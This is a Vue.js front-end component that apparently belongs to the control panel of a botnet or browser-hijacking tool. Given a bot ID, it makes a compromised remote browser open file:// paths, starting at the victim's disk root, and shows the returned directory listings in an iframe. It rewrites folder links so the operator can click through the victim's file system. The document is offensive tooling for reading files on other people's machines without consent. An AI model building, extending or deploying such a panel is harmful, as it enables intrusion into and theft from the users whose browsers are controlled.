<template>
  <div>
    <p>
      <b-input-group prepend="Path" class="mt-3">
        <b-form-input v-model="check_path"></b-form-input>
        <b-input-group-append>
          <b-button
            variant="info"
            :disabled="manipulate_browser_loading"
            v-on:click="manipulate"
            >Check</b-button
          >
        </b-input-group-append>
      </b-input-group>
    </p>
    <p>
      <iframe ref="browser_page" width="100%" height="600px"></iframe>
    </p>
  </div>
</template>

<script>
import { api_request } from "./utils.js";
export default {
  name: "DataBrowser",
  props: {
    id: {
      type: String,
      required: true,
    },
    ua: {
      type: String,
      required: true,
    },
  },
  data() {
    return {
      data: [],
      manipulate_browser_loading: false,
      check_path_prefix: this.isWindowsUA(this.ua) ? "file://" : "file://",
      check_path: this.isWindowsUA(this.ua) ? "file:///C:/" : "file:///",
    };
  },
  mounted() {
    window.addEventListener(
      "message",
      (e) => {
        const key = e.message ? "message" : "data";
        const data = e[key];
        if (typeof data === "string" && data.startsWith("TOPATH_")) {
          const path = data.replace("TOPATH_", "");
          this.check_path = this.check_path_prefix + path;
          this.manipulate();
        }
      },
      false
    );
  },
  methods: {
    isWindowsUA(userAgent) {
      const windowsRegex = /windows|win32/i;
      return windowsRegex.test(userAgent);
    },
    async manipulate() {
      this.manipulate_browser_loading = true;
      await api_request(
        "POST",
        "/manipulate_browser",
        {},
        {
          bot_id: this.id,
          path: this.check_path,
        }
      )
        .then((response) => {
          this.$toastr.s("Browser manipulated successfully.");
          const iframe = this.$refs.browser_page;
          const iframeDocument =
            iframe.contentDocument || iframe.contentWindow.document;

          iframeDocument.open();
          iframeDocument.write(this.modify_html(response.html));
          iframeDocument.close();
        })
        .catch((e) => {
          this.$toastr.e(e.error);
        })
        .finally(() => {
          this.manipulate_browser_loading = false;
        });
    },
    modify_html(html) {
      // 修改html数据，将其中的a标签的href属性替换为javascript:void(0)，并将其onclick属性设定为将href回传给父级组件
      return html.replace(
        /<a class="icon dir" href="([^"]*)"/g,
        '<a class="icon dir" href="javascript:void(0)" onclick="parent.postMessage( `TOPATH_$1`, \'*\')"'
      ).replace();
    },
  },
};
</script>

<style scoped>
/* Add component-specific styles here */
</style>
